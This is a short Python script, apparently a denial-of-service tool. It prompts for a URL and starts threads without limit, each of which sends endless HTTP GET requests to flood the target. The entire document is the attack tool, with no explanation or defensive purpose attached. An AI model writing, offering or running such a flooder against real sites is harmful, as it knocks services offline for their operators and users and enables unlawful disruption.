import threading, requests
link = input('link: ')

def dos():
    while True:
        for i in range(1, 111111):
            requests.get(link)

while True:
    for i in range(1, 111111):
        threading.Thread(target=dos).start()
